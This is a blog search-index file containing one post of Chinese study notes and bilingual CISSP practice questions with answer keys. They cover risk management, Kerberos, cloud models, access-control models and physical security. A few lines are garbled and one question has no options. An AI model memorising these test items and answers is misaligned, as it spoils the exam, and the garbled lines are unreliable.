<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>错题</title>
    <link href="/2025/06/18/security/seccert/cissp/%E9%94%99%E9%A2%98/"/>
    <url>/2025/06/18/security/seccert/cissp/%E9%94%99%E9%A2%98/</url>
    
    <content type="html"><![CDATA[<span id="more"></span><h2 id="第二章"><a href="#第二章" class="headerlink" title="第二章"></a>第二章</h2><h3 id="NDA"><a href="#NDA" class="headerlink" title="NDA"></a>NDA</h3><p>解雇程序通常侧重于解雇那些有问题的员工，不管这个员工是否犯罪或者只是违</p><p>反了公司的政策。一旦员工被解雇，公司就无法直接控制这个人。因此，唯一剩下的手段就</p><p>是法律，这通常与保密协议(NDA) 相关。希望通过审查和提醒前员工所签署的保密协议，可</p><p>减少未来的安全问题，如机密数据的传播。</p><h3 id="资产、威胁、脆弱性、暴露、风险"><a href="#资产、威胁、脆弱性、暴露、风险" class="headerlink" title="资产、威胁、脆弱性、暴露、风险"></a>资产、威胁、脆弱性、暴露、风险</h3><h3 id="风险缓解、风险忽略、风险接受、风险转移"><a href="#风险缓解、风险忽略、风险接受、风险转移" class="headerlink" title="风险缓解、风险忽略、风险接受、风险转移"></a>风险缓解、风险忽略、风险接受、风险转移</h3><h3 id="风险的定义"><a href="#风险的定义" class="headerlink" title="风险的定义"></a>风险的定义</h3><h3 id="RMF-阶段"><a href="#RMF-阶段" class="headerlink" title="RMF 阶段"></a>RMF 阶段</h3><p> RMF 阶段(6) 是在确定组织运营和资产、个人、其他组织和国家／地区的风险是可</p><p>接受（或合理）的基础上，授权系统或共同控制。 RMF 的阶段包括： （ l ）准备、 (2) 分类、 (3) 选</p><p>择、 (4) 实施、 (5) 评估、 (6) 授权和(7) 监控。 (A) 是 RMF 阶段(2) ，指根据对损失影响的分析，</p><p>对系统以及系统处理、存储和传输的信息进行分类。 (C) 是 RMF 阶段(5) ，评估控制以确定控</p><p>制是否正确实施、是否按预期运行以及是否产生满足安全和隐私要求的预期结果。 (D) 是 RMF</p><p>阶段(7), 待续监控系统和相关控制，包括评估控制有效性、记录系统和操作环境的变化、进</p><p>行风险评估和影响分析，以及报告系统的安全和隐私状况。</p><h3 id="社会工程学"><a href="#社会工程学" class="headerlink" title="社会工程学"></a>社会工程学</h3><p>社会工程学需要和受害者互动</p><h2 id="第三章"><a href="#第三章" class="headerlink" title="第三章"></a>第三章</h2><h3 id="风险接受文档"><a href="#风险接受文档" class="headerlink" title="风险接受文档"></a>风险接受文档</h3><p>解决可接受风险的风险缓解控制措施不会包含在 BCP 中。风险接受文档应包含</p><p>对组织面临的风险的全面审查，包括确定哪些风险应被视为可接受或不可接受。对千可接受</p><p>的风险，文档应包括风险可接受的原因以及未来可能需要重新考虑此决定的可能事件。文</p><p>档还应包括用千缓解不可接受风险的控制措施列表，但不包括用千缓解可接受风险的控制，</p><p>因为可接受的风险不需要缓解。</p><h3 id="BCP-流程"><a href="#BCP-流程" class="headerlink" title="BCP 流程"></a>BCP 流程</h3><p>预备和处理阶段，BCP 团队设计流程和机制来减轻在策略开发阶段被认为不</p><p>可接受的风险。</p><p>操作系统-安全内核</p><p>风险管理-风险评估</p><p>WAN 技术-SONET、MPLS、PCoE、SIP</p><p>文件完整性检查器</p><p>审计日志</p><p>变更管理-实施前的用户验收测试 UAT</p><p>SOC 2 类型是供应商拥有的最佳服务组织控制 SOC 认证</p><p>资产管理参考架构的第一层会对移动设备进行跟踪</p><p>人力资源部门最适合启动用户账户的供应和解除供应操作</p><p>在 计划-执行-检查-行动模型的执行阶段，会实施业务连续性政策、控制措施、流程和程序</p><p>服务组织控制 SOC</p><p>再解决道德冲突时，应该按照公共安全、对委托人的认证、对个人的责任、对职业的责任顺序最考虑因素进行优先级排序</p><p>ITIL</p><p>缺乏支持本地部署解决方案的内部资源促使一家公司选择身份即服务（IDaaS）</p><p>具有公共IP地址的数据包通常会被允许进入网络，因此您不应该创建规则来阻止它们。具有内部源地址的数据包不应来自网络外部，因此应阻止它们进入网络。带有外部源地址的数据包永远不会出现在内部网络中，因此应该阻止它们离开网络。最后，私有IP地址不应该在互联网上使用，因此应该阻止包含私有IP地址的数据包离开网络。</p><p>Q：</p><p>Darren is troubleshooting an authentication issue for a Kerberized application used by his organization. He believes the issue is with the generation of session keys. What Kerberos service should he investigate first?<br>Darren正在对其组织使用的Kerberized化应用程序的身份验证问题进行故障排除。他认为问题在于会话密钥的生成。他应该首先调查哪个Kerberos服务？</p><p>A KDC</p><p>B TGT</p><p>C AS</p><p>D TGS</p><p>A：</p><p>TGS或票据授予服务(通常与KDC在同一个服务器上)从客户端接收TGT。它验证TGT和用户访问他们请求使用的服务的权限。然后，TGS向客户端发放票证和会话密钥。AS充当认证服务器，将用户名转发给KDC。值得注意的是，客户端并不直接与KDC通信。相反，它将与TGT和AS通信，这意味着KDC不是这里的合适答案。</p><p>Q：</p><p>Evelyn believes that one of her organization’s vendors has breached a contractual obligation to protect sensitive data and would like to conduct an investigation into the circumstances. Based upon the results of the investigation, it is likely that Evelyn’s organization will sue the vendor for breach of contract. What term best describes the type of investigation that Evelyn is conducting?<br>Evelyn认为，她所在组织的一家供应商违反了保护敏感数据的合同义务，并希望对此展开调查。根据调查结果，Evelyn的组织可能会起诉该供应商违反合同。哪个术语最恰当地描述了Evelyn正在进行的调查类型？</p><p>A Administrative investigation<br> 行政调查</p><p>B Criminal investigation<br> 刑事侦查</p><p>C Civil investigation<br> 民事调查</p><p>D Regulatory investigation<br> 监管调查</p><p>A：</p><p>这是民事调查的一个例子，因为它与合同纠纷有关，很可能会在民事法庭进行诉讼。行政调查是为了内部目的，在调查第三方时不适用。刑事和监管调查只能由具有监管权力的机构发起，通常是政府机构。</p><p>Q：</p><p>Kevin is reviewing and updating the security documentation used by his organization. He would like to document some best practices for securing IoT devices that his team has developed over the past year. The practices are generalized in nature and do not cover specific devices. What type of document would be best for this purpose?<br>Kevin正在检查和更新他的组织所使用的安全文档。他希望记录他的团队在过去一年中开发的一些保护物联网设备的最佳实践。这些实践本质上是一般化的，并不涵盖具体的设备。什么类型的文件最适合这个目的？</p><p>A Policy<br> 政策</p><p>B Standard<br> 标准</p><p>C Guideline<br> 准则</p><p>D Procedure<br> 规程</p><p>A：</p><p>Kevin可能会使用这些文件中的任何一个。我们应该关注问题中表明这些是最佳实践的部分。这意味着建议不是强制性的，因此不会成为政策或标准。该建议本质上是一般性的，这意味着它可能不太适合规程的step-by-step特征。准则guideline是记录这些最佳实践的最佳位置。</p><p>Q：</p><p>Tom is tuning his security monitoring tools in an attempt to reduce the number of alerts received by administrators without missing important security events. He decides to configure the system to only report failed login attempts if there are five failed attempts to access the same account within a one-hour period of time. What term best describes the technique that Tom is using?<br>Tom正在调整他的安全监控工具，试图在不遗漏重要安全事件的情况下减少管理员收到的警报数量。他决定将系统配置为仅在一个小时内有五次访问同一账户的失败尝试时才报告失败的登录尝试。哪个术语最恰当地描述了Tom使用的技术？</p><p>A Thresholding<br> 阈值处理</p><p>B Sampling<br> 抽样</p><p>C Account lockout<br> 账户锁定</p><p>D Clipping<br> 修剪</p><p>A：</p><p>修剪clipping是一种分析技术，仅在警报超过设定的阈值后才报告警报。它是抽样的一种特殊形式，是一个更一般的术语，描述任何试图摘录记录以供审查的行为。阈值不是一个常用的术语。管理员可以选择在登录尝试失败后配置自动或手动账户锁定，但在场景中没有描述这一点。</p><p>Q：</p><p>Alice would like to have read permissions on an object and knows that Bob already has those rights and would like to give them to herself. Which one of the rules in the Take-Grant protection model would allow her to complete this operation if the relationship exists between Alice and Bob?<br>Alice希望拥有对某个客体的读取权限，并且知道Bob已经拥有这些权限，并且希望将这些权限授予她自己。在Alice和Bob之间存在合适关系的前提下，Take-Grant保护模型中的哪一条规则将允许她完成该操作？</p><p>A Take rule<br> 获取规则</p><p>B Grant rule<br> 授予规则</p><p>C Create rule<br> 创建规则</p><p>D Remote rule<br> 远程规则</p><p>A：</p><p>获取-授予保护模型中的接受规则允许主体从另一个对象获取权限，前提是该主体对该对象具有获取(take)权限。在这种情况下，如果Alice对Bob拥有take权限，而Bob对某个对象拥有read权限，Alice可以使用take规则授予自己Bob拥有的read权限。授予规则是为了将权利授予其他主体，而不是为了将权利据为己有。创建规则用于创建新的对象或权限，而不是转移现有的对象或权限。在获取-授予保护模型中没有远程规则。</p><p>Q：</p><p>Daniel正在为他的组织选择一个移动设备管理(MDM)解决方案，并正在撰写采购需求。在将组织的安全需求与MDM平台的功能相结合之后，他正在尝试决定应该将哪些特性作为需求包括在内。以下哪些是MDM解决方案的典型功能？(选择所有适用的选项。)</p><p>A Remotely wiping the contents of a mobile device<br> 远程擦除移动设备的内容</p><p>B Assuming control of a nonregistered BYOD mobile device<br> 希望控制未注册的BYOD移动设备</p><p>C Enforcing the use of device encryption<br> 强制使用设备加密</p><p>D Managing device backups<br> 管理设备备份</p><p>A：</p><p>MDM产品不具备控制当前不由组织管理的设备的能力。这相当于入侵他人的设备，可能构成犯罪。它们通常提供管理设备备份、强制使用加密和远程擦除移动设备内容的能力。</p><p>Q：</p><p>使用粉碎shredding方法可以安全有效地处置以下哪些数据资产？(选择所有适用的选项。)</p><p>A Paper records<br> 纸质记录</p><p>B Credit cards<br> 信用卡</p><p>C Removable media<br> 可移动媒体</p><p>D SSD hard drives<br> 固态硬盘</p><p>A：</p><p>传统的办公室碎纸机可用于处理纸质记录，根据其等级，也可以粉碎信用卡。工业粉碎机能够破坏较大的设备，包括可移动介质以及传统硬盘和固态硬盘。</p><p>Q：</p><p>Greg正在评估一家将为其组织提供网络设备的新供应商。由于其组织的工作性质，Greg担心攻击者可能会试图利用供应链漏洞。假设Greg的组织和供应商都在合理的安全程序下运营，以下哪项活动可能会给设备带来最大的供应链风险？</p><p>A Tampering by an unauthorized third party at the vendor’s site<br> 未经授权的第三方在供应商处实施篡改</p><p>B Interception of devices in transit<br> 拦截运输中的设备</p><p>C Misconfiguration by an administrator after installation<br> 安装后管理员的错误配置</p><p>D Tampering by an unauthorized third party at Greg’s site<br> 被未经授权的第三方在Greg的站点实施篡改</p><p>A：</p><p>如果供应商按照合理的安全程序操作，设备不太可能在供应商处被篡改。同样，如果Greg的组织有合理的安全程序，篡改也不太可能发生在他的站点。管理员的错误配置总是可能的，但这是安装后风险，而不是供应链风险。设备在从供应商运送到Greg的组织的过程中可能会被拦截和篡改。</p><p>Q：</p><p>Kevin在一个单级安全环境中工作，并试图根据信息系统处理的信息类型对信息系统进行分类。他分配资产分类的最佳方式是什么？</p><p>A Assign systems the classification of information that they most commonly process.<br> 给系统分配它们最常处理的信息分类。</p><p>B Assign systems the classification of the highest level of information that they are expected to process regularly.<br> 为系统分配期望它们定期处理的最高级别信息的分类。</p><p>C Assign systems the classification of the highest level of information that they are ever expected to process.<br> 给系统分配它们预期要处理的最高级别信息的分类。</p><p>D Assign all systems the same classification level.<br> 给所有系统分配相同的分类级别。</p><p>A：</p><p>在单级安全环境中，应该为系统分配期望它们处理的最高信息分类的分类级别。如果不对系统进行向上重新分类，系统可能无法处理高于其分类级别的信息。</p><p>Q：</p><p>Nandi正在评估一组候选系统，以取代其组织中的生物认证机制。比较不同系统有效性的最佳方法是什么？</p><p>A FAR</p><p>B FRR</p><p>C CER</p><p>D FDR</p><p>A：</p><p>错误接受率(FAR)是系统无意中接纳非授权用户的比率，而错误拒绝率(FRR)是系统无意中拒绝授权用户的比率。FAR和FRR都可以通过调整系统的灵敏度来修改。交叉错误率(CER)是错误接受率和错误拒绝率的交叉点。CER受操纵的影响较小，因此是评估系统的最佳指标。FDR不是用于评估身份认证系统的指标。</p><p>Q：</p><p>John正在为他的组织开发一个有形资产清单。以下哪些项目最有可能包含在此清单中？(选择所有适用的选项。)</p><p>A Intellectual property<br> 知识产权</p><p>B Server hardware<br> 服务器硬件</p><p>C Files stored on servers<br> 存储在服务器上的文件</p><p>D Mobile devices<br> 移动设备</p><p>A：</p><p>有形资产库存包括组织拥有的实物项目。这包括服务器硬件和移动设备。存储在服务器上的知识产权和文件不是有形财产，而是包含在无形资产清单中。</p><p>Q：</p><p>Bert正在考虑使用基础设施即服务(IaaS)云计算合作伙伴来提供虚拟服务器。在这种情况下，以下哪一项是供应商的责任？</p><p>A Maintaining the hypervisor<br> 维护虚拟机管理程序</p><p>B Managing operating system security settings<br> 管理操作系统安全设置</p><p>C Maintaining the host firewall<br> 维护主机防火墙</p><p>D Configuring server access control<br> 配置服务器访问控制</p><p>A：</p><p>在IaaS服务器环境中，在共同责任模式下，客户保留大多数服务器安全操作的责任。这包括管理操作系统安全设置、维护主机防火墙和配置服务器访问控制。供应商将负责管理程序层及其以下的所有安全机制。</p><p>Q：</p><p>当Ben记录数据，然后在测试网站上回放数据，以验证数据在真实生产工作负载下的表现时，他在进行哪种类型的性能监控？</p><p>A Passive<br> 被动的</p><p>B Proactive<br> 主动的</p><p>C Reactive<br> 反应的</p><p>D Replay<br> 重放</p><p>A：</p><p>主动监控，也称为综合监控，使用记录或生成的流量来测试系统和软件。被动监控使用网络跨距、分路器或其它设备来捕获要分析的流量。反应式和重放不是监控类型的行业术语。</p><p>Q：</p><p>Bailey担心她的组织中的用户在各种云服务中使用敏感信息，并希望在这些服务中一致地实施安全策略。什么样的安全控制最适合她的需求？</p><p>A DRM</p><p>B IPS</p><p>C CASB</p><p>D DLP</p><p>A：</p><p>云访问安全代理(CASBs)旨在跨云服务一致地实施安全策略，最能满足Bailey的需求。数据丢失防护(DLP)和数字版权管理(DRM)解决方案可能能够检测、阻止和控制云中信息的某些使用，但它们无法提供跨云平台一致实施安全策略的方法。入侵防御系统(IPS)旨在检测和阻止恶意活动，与此场景无关。</p><p>Q：</p><p>Jerry正在调查一次攻击，攻击者从用户的web会话中窃取了一个身份验证令牌，并使用它在站点上冒充用户。哪个术语最能描述这种攻击？</p><p>A Masquerading<br> 假冒</p><p>B Replay<br> 重播</p><p>C Spoofing<br> 电子欺骗</p><p>D Modification<br> 修正</p><p>A：</p><p>伪装(或冒充)攻击使用窃取或伪造的凭证来绕过身份验证机制。该术语确实描述了这种攻击，但是即使在找到可能的正确答案后，您也应该继续阅读答案选项。在这种情况下，重放攻击是一种更具体的伪装攻击，它依赖于捕获的身份验证令牌，因此，这是一个更好的答案。欺骗攻击依赖于伪造身份，如没有凭据的IP地址或主机名。当捕获的数据包被修改并向系统重播以试图执行某个操作时，就会发生修改攻击。</p><p>Q：</p><p>Lisa希望与使用OAuth 2.0的云身份提供商集成，她希望选择一个合适的身份认证框架。以下哪一项最符合她的需求？</p><p>A OpenID Connect</p><p>B SAML</p><p>C RADIUS</p><p>D Kerberos</p><p>A：</p><p>OpenID Connect是一个身份验证层，它使用OAuth 2.0作为底层授权框架。它已被云服务提供商广泛采用并得到广泛支持。SAML、RADIUS和Kerberos是替代的身份验证技术，但是不具备与OAuth 2.0相同级别的无缝集成。</p><p>Q：</p><p>下列关于SSAE-18的陈述中哪些是正确的？(选择所有适用的选项。)</p><p>A It mandates a specific control set.<br> 它要求一个特定的控制集。</p><p>B It is an attestation standard.<br> 它是一个认证标准。</p><p>C It is used for external audits.<br> 它用于外部审计。</p><p>D It uses a framework, including SOC 1, SOC 2, and SOC 3 reports.<br> 它使用一个框架，包括SOC 1、SOC 2和SOC 3报告。</p><p>A：</p><p>SSAE-18没有提出具体的控制措施，而是审查被审计组织中控制的使用和应用。它是一种认证标准，用于外部审计，并构成SOC 1、2和3报告的基础框架的一部分。</p><p>Q：</p><p>Greg正在为他的组织制定灾难恢复计划，并希望确定在中断后恢复特定IT服务所需的时间。Greg在计算什么变量？</p><p>A MTD</p><p>B RTO</p><p>C RPO</p><p>D SLA</p><p>A：</p><p>恢复时间目标(RTO)是指发生故障后，IT服务或组件恢复运行所需的时间。<br> 最大容许停机时间(MTD)是在不对组织造成严重损害的情况下，IT服务或组件不可用的最长时间。<br> 恢复点目标(RPO)确定在恢复过程中可能丢失的最大数据量(以时间为单位)。<br> 服务水平协议(SLA)是记录服务期望的书面合同。</p><p>Q：</p><p>Chris工作的公司在每个门口都张贴了通知，提醒员工小心不要让人进来。这是哪种类型的控件？</p><p>A Detective<br> 检测的</p><p>B Physical<br> 物理的</p><p>C Preventive<br> 预防的</p><p>D Directive<br> 指示的</p><p>A：</p><p>通知和程序，如Chris工作的公司张贴的标志，是指令性访问控制的示例。检测控制是为事后操作而设计的。门和门上的锁是物理控制的例子。预防性控制旨在阻止事件发生，也可以包括门上的锁。</p><p>Q：</p><p>Seth正在为他的组织正在建造的新设施设计物理安全控制。他希望尽可能地阻止袭击。以下哪些控制措施具有威慑作用？(选择所有适用的选项。)</p><p>A Motion detectors<br> 运动检测器</p><p>B Guard dogs<br> 看门狗</p><p>C Access control vestibules<br> 出入控制通廊</p><p>D Lighting<br> 照明设备</p><p>A：</p><p>威慑控制首先寻求阻止入侵者进行攻击的企图。看门狗有一个令人生畏的存在，很好地服务于这个目的。根据他们的训练，他们也可以拒绝、检测和延迟入侵。照明还通过使潜在入侵更加明显来阻止攻击，减少入侵者进入照明良好区域的可能性。门禁走廊(也称为陷阱)旨在拒绝入侵者进入，而不是阻止企图。运动探测器旨在探测入侵者，而不是阻止他们。</p><p>Q：</p><p>攻击者截获了大量使用相同算法和加密密钥加密的数据。在没有进一步信息的情况下，下列哪些密码分析攻击是可能的？(选择所有适用的选项。)</p><p>A Known plaintext<br> 已知明文</p><p>B Chosen ciphertext<br> 选择密文</p><p>C Frequency analysis<br> 频率分析</p><p>D Brute force<br> 暴力</p><p>A：</p><p>攻击者可能试图对大量加密的密文执行频率分析或暴力攻击。由于攻击者无法访问明文信息，已知的明文攻击是不可能的。攻击者也没有加密信息的能力，所以他们不能使用选择密文攻击。</p><p>Q：</p><p>Adam正在处理一个终端用户的访问请求。在授予访问权限之前，他应该验证哪两项？</p><p>A Separation and need to know<br> 分离和需要知道</p><p>B Clearance and endorsement<br> 许可和背书</p><p>C Clearance and need to know<br> 许可和需要知道</p><p>D Second factor and clearance<br> 第二因素和许可</p><p>A：</p><p>在授予任何用户访问信息的权限之前，Adam应验证该用户是否具有适当的安全许可，以及是否有了解相关信息的业务需求。</p><p>Q：</p><p>Dana正在为她的组织选择一个散列函数，并且希望在对加密的强散列与算法的速度和效率之间取得平衡。以下哪一个哈希函数最能满足她的需求？</p><p>A MD5</p><p>B RIPEMD</p><p>C SHA-2</p><p>D SHA-3</p><p>A：</p><p>原始版本的RIPEMD和MD5哈希算法存在已知漏洞，不应再使用。SHA-2和SHA-3现在都被认为是安全的，并且提供相同的安全级别。然而，SHA-3的效率低于SHA-2，因此SHA-2是满足Dana的需求的更好选择。</p><p>Q：</p><p>Rob正在使用通过环境设计预防犯罪(CPTED)框架审查其组织的校园的物理安全性。以下哪一项不是该框架中的策略？</p><p>A Natural intrusion detection<br> 自然入侵检测</p><p>B Natural access control<br> 自然访问控制</p><p>C Natural surveillance<br> 自然监视</p><p>D Natural territorial reinforcement<br> 自然领域强化</p><p>A：</p><p>CPTED实施三种策略:自然访问控制、自然监视和自然领域强化。<br> 自然访问控制使用路障和其他物理元素来创建安全和不安全空间之间的隔离。<br> 自然监视将环境设计成让潜在的入侵者暴露在合法居住者的自然审视之下。<br> 自然领域强化使用栅栏、标志和其他元素来清晰地定义安全空间。<br> 自然入侵检测不是CPTED的一个元素。</p><p>Q：</p><p>MAC模型使用三种类型的环境。以下哪一项不是强制访问控制设计？</p><p>A Hierarchical<br> 层次的</p><p>B Bracketed<br> 括号</p><p>C Compartmentalized<br> 隔间化</p><p>D Hybrid<br> 混合</p><p>A：</p><p>强制访问控制系统可以是分层的，其中每个域都是有序的，并且与它上面和下面的其他域相关联（比如高级别主体可以读取低级别客体）；也可以是隔间化的，每个域之间没有关系；或者混合式，同时使用层次结构和隔间。强制访问控制设计中没有括号bracketing的概念。</p><p>Q：</p><p>Mandy是一个六人项目小组的组长(包括她自己)。她希望为这些人提供私密通信的能力，这样任何一对人都可以交换通信，而不会被任何其他人(团队成员或非团队成员)截获。该团队使用的是非对称加密算法。实现这些要求需要多少个密钥？</p><p>A 6</p><p>B 12</p><p>C 15</p><p>D 36</p><p>A：</p><p>不论参与者的数量多少，非对称加密算法要求每个用户两个密钥，因此这个六人小组需要12把钥匙。如果这个团队使用对称加密，他们将需要(n*(n-1))&#x2F;2或(6*(6-1))&#x2F;2 &#x3D; 15个密钥。</p><p>Q：</p><p>Frances担心公司服务器中的设备故障会导致这些服务器断电。以下哪种控制措施最能解决这一风险？</p><p>A Redundant power sources<br> 冗余电源</p><p>B Backup generators<br> 备用发电机</p><p>C Dual power supplies<br> 双电源</p><p>D Uninterruptible power supplies<br> 不间断电源</p><p>A：</p><p>所有这些控制都有助于提高服务器电源的可靠性。但是，只有双电源解决服务器内部出现的硬件问题，允许服务器在其中一个电源出现故障时继续运行。冗余电源、备用发电机和不间断电源(UPS)旨在提高向服务器供电的可靠性。</p><p>Q：</p><p>Matthew在他的组织的网络上遇到了网络服务质量问题。主要症状是数据包从源传输到目的地有时需要很长时间。这种延迟的长度因单个数据包而异。哪个术语描述了Matthew面临的问题？</p><p>A Latency<br> 延迟</p><p>B Jitter<br> 抖动</p><p>C Packet loss<br> 丢包</p><p>D Interference<br> 干扰</p><p>A：</p><p>术语延迟Latency是指数据包从源传输到目的地的时延。抖动是不同数据包延迟的变化。数据包丢失是指需要重新传输的数据包在传输过程中消失。干扰是破坏数据包内容的电噪声或其他干扰。</p><p>Q：</p><p>Gavin是一名内部审计员，致力于评估其组织的网络安全状况。以下哪一项是他从工作中产生的报告的合适接收者？(选择所有适用的选项。)</p><p>A Managers<br> 管理者们</p><p>B Individual contributors<br> 独立贡献者(在工作或项目中以个人身份独立完成任务或提供贡献的人)</p><p>C Suppliers<br> 供应商</p><p>D Board members<br> 董事会成员</p><p>A：</p><p>将内部审计报告分发给组织中有正当需要了解的任何人都是完全合适的。这可能包括负责补救问题的管理层和个人贡献者，以及负责监督的理事会成员。将内部审计报告分发给外部实体(如供应商和客户)通常是不合适的。</p><p>Q：</p><p>Kim正在对其组织开发的一个web应用程序进行测试，她希望确保该应用程序可以从所有常用的web浏览器中访问。她应该进行什么类型的测试？</p><p>A Regression testing<br> 回归测试</p><p>B Interface testing<br> 接口测试</p><p>C Fuzzing<br> 模糊测试</p><p>D White-box testing<br> 白盒测试</p><p>A：</p><p>Web应用程序通过一个接口与web浏览器通信，这使得接口测试成为这里的最佳答案。回归测试可能被用作接口测试的一部分，但是过于具体而不是最佳答案。类似地，测试可能是一个白盒，或者全知识测试，但是接口测试更好地描述了这个具体的例子。模糊不太可能是浏览器兼容性测试的一部分，因为它测试的是意外输入，而不是功能。</p><p>Q：</p><p>Ben希望使用标准化协议与国家漏洞数据库连接。他应该使用什么选项来确保他构建的工具能够处理NVD中包含的数据？</p><p>A XACML</p><p>B SCML</p><p>C VSML</p><p>D SCAP</p><p>A：</p><p>安全内容自动化协议(SCAP)是一套用于处理漏洞和安全配置信息的规范。NIST提供的国家脆弱性数据库使用SCAP。XACML是可扩展访问控制标记语言，是用于访问控制决策的OASIS标准，VSML和SCML都不是行业术语。</p><p>Q：</p><p>Ron的组织没有资源来执行时间密集型的人工渗透测试，但是他希望获得渗透测试的一些好处。他可以从事以下哪一项需要最少人工的技术？</p><p>A White-box testing<br> 白盒测试</p><p>B Black-box testing<br> 黑盒测试</p><p>C Gray-box testing<br> 灰箱测试</p><p>D Breach and attack simulation<br> 入侵和攻击模拟</p><p>A：</p><p>入侵和攻击模拟(BAS)平台旨在自动化渗透测试的某些方面。这些系统旨在将威胁指示器植入系统和网络，以触发其他安全控制。白盒、灰盒和黑盒测试都涉及到更多的手工工作。</p><p>Q：</p><p>Nikto lists OSVDB-877, noting that the system may be vulnerable to XST. What would this type of attack allow an attacker to do? Nikto列出了OSVDB-877，指出该系统可能容易受到XST的攻击。这种类型的攻击允许攻击者做什么？</p><p>A Use cross-site targeting. 使用跨站点定位。</p><p>B Steal a user’s cookies. 窃取用户的cookies。</p><p>C Counter SQL tracing. 计数器SQL跟踪。</p><p>D Modify a user’s TRACE information. 修改用户的TRACE信息。</p><p>A：</p><p>Cross-site tracing (XST) leverages the HTTP TRACE or TRACK methods and could be used to steal a user’s cookies via cross-site scripting (XSS). The other options are not industry terms for web application or web server attacks or vulnerabilities. 跨站点跟踪(XST)利用HTTP TRACE或TRACK方法，可用于通过跨站点脚本(XSS)窃取用户的cookies。其他选项不是web应用程序或web服务器攻击或漏洞的行业术语。</p><p>Q：</p><p>Alex has access to B, C, and D in the diagram. What concern should he raise to the university’s identity management team? Alex可以访问图中的B、C和D。他应该向大学的身份管理团队提出什么问题？</p><p>A The provisioning process did not give him the rights he needs. 预配过程没有给他所需的权限。</p><p>B He has excessive privileges. 他拥有过多的特权。</p><p>C Privilege creep may be taking place. 特权蔓延可能正在发生。</p><p>D Logging is not properly enabled. 未正确启用日志记录。</p><p>A：</p><p>As Alex has changed roles, he retained access to systems that he no longer administers. The provisioning system has provided rights to workstations and the application servers he manages, but he should not have access to the databases he no longer administers. Privilege levels are not specified, so we can’t determine if he has excessive privileges. Logging may or may not be enabled, but it isn’t possible to tell from the diagram or problem. 随着Alex角色的改变，他保留了对他不再管理的系统的访问权。供应系统已经向他管理的工作站和应用服务器提供了权限，但是他不应该访问他不再管理的数据库。没有指定权限级别，所以我们无法确定他是否拥有过多的权限。日志记录可能已启用，也可能未启用，但是从图表或问题中无法看出。</p><p>Q：</p><p>如果Ben需要与所示的业务伙伴共享身份信息，他应该探讨什么？</p><p>A Single sign-on 单点登录</p><p>B Multifactor authentication 多因素认证</p><p>C Federation 联邦</p><p>D IDaaS</p><p>A：</p><p>联盟链接多个组织之间的身份信息。与业务伙伴联合可以允许在它们之间进行识别和授权，从而使集成更加容易。单点登录将减少用户登录的次数，但不会促进身份信息的共享。多因素身份认证有助于保护身份认证，但同样无助于与第三方集成。最后，IDaaS可能提供多方身份共享，但不保证。</p><p>Q：</p><p>在实施了第一个问题的解决方案后，Ben收到了一份投诉，内容是他的咖啡馆中的用户劫持了其他客户的网络流量，包括使用他们的用户名和密码。这怎么可能呢？</p><p>A The password is shared by all users, making traffic vulnerable. 口令由所有用户共享，使流量易受攻击。</p><p>B A malicious user has installed a Trojan on the router. 恶意用户在路由器上安装了特洛伊木马。</p><p>C A user has ARP spoofed the router, making all traffic broadcast to all users. 用户对路由器进行ARP欺骗，使所有流量广播给所有用户。</p><p>D Open networks are unencrypted, making traffic easily sniffable. 开放网络是不加密的，这使得流量很容易被嗅探。</p><p>A：</p><p>未加密的开放网络明文广播流量。这意味着未加密的网站会话很容易被数据包嗅探器捕获。一些像FireSheep这样的工具是专门设计来从流行网站上捕捉会话的。幸运的是，现在许多网站默认使用TLS，但其他网站仍然以明文形式发送用户会话信息。共享密码不是漏洞的原因，ARP欺骗不是无线网络的问题，特洛伊被设计成看起来像安全软件，而不是危及路由器</p><p>Q：</p><p>在下图中，Harry读取数据文件的请求被阻止。Harry有秘密级安全许可，数据文件有绝密级。Bell–LaPadula模型的什么原理阻止了这个请求？</p><p>A：</p><p>简单安全属性防止个人以高于其许可所允许的安全级别读取信息。这也被称为“不向上读取”规则。简单完整性属性表示主题不能读取较低完整性级别的对象(无向下读取)。*-Security属性表示用户不能将数据写入比自己更低的安全级别。自主安全属性允许使用矩阵来确定访问权限。</p><p>Q：</p><p>Kolin正在寻找一种网络安全解决方案，使他能够帮助减少零日攻击，同时在系统连接到网络之前使用身份在系统上实施安全策略。Kolin应该实施什么类型的解决方案？</p><p>A A firewall<br> 防火墙</p><p>B A NAC system<br> NAC系统</p><p>C An intrusion detection system<br> 入侵检测系统</p><p>D Port security<br> 端口安全</p><p>A：</p><p>网络访问控制(NAC)系统可用于对用户进行身份验证，然后在允许用户连接到网络之前验证其系统是否符合安全标准。实施安全配置文件有助于减少零日攻击，使NAC成为有用的解决方案。防火墙不能执行系统安全策略，而IDS只能监控攻击并在攻击发生时发出警报。因此，防火墙和IDS都不能满足Kolin的需求。最后，端口安全是一种基于MAC地址的安全功能，它只能限制哪些系统或设备可以连接到给定的端口。</p><p>Q：</p><p>在何种云计算模式下，客户是在自己的数据中心构建云计算环境，或在另一个数据中心构建供该客户专用的环境？</p><p>A Public cloud<br> 公共云</p><p>B Private cloud<br> 私有云</p><p>C Hybrid cloud<br> 混合云</p><p>D Shared cloud<br> 共享云</p><p>A：</p><p>在私有云计算模式中，云计算环境专用于单个组织，而不是共享租用模式。该环境可以由公司在自己的数据中心构建，也可以由供应商在托管地点构建。</p>]]></content>
    
    
    <categories>
      
      <category>security</category>
      
      <category>seccert</category>
      
    </categories>
    
    
    <tags>
      
      <tag>security</tag>
      
      <tag>seccert</tag>
      
      <tag>cissp</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title></title>
    <link href="/2025/06/09/security/aisec/ai-qa/"/>
    <url>/2025/06/09/security/aisec/ai-qa/</url>
    
